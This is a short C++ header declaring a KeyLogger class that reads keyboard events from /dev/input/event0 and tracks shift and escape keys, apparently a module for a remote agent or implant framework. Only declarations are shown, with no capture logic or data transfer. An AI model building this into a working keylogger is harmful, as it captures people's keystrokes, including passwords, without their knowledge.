#include "../Agent/BaseModule.h"

#define UK "UNKNOWN"
// change this if needed!
#define KEYBOARD "/dev/input/event0"
#define ESCAPE(key) (key == KEY_ESC)
#define SHIFT(key)  ((key == KEY_LEFTSHIFT) || (key == KEY_RIGHTSHIFT))

class KeyLogger : public BaseModule
{
private:
    unsigned int keyboard_fd;
    int shift_flag = 0;
    std::mutex mtx;

    void module_impl() override;
    void stop() override;

public:
    KeyLogger() = delete;
    KeyLogger(const KeyLogger &) = delete;

    KeyLogger(std::string mtype, const json & module_args) : BaseModule(mtype, module_args) 
    {
        std::cout << module_args.dump() << std::endl;
        keyboard_fd = 0;
    };

    ~KeyLogger();
};
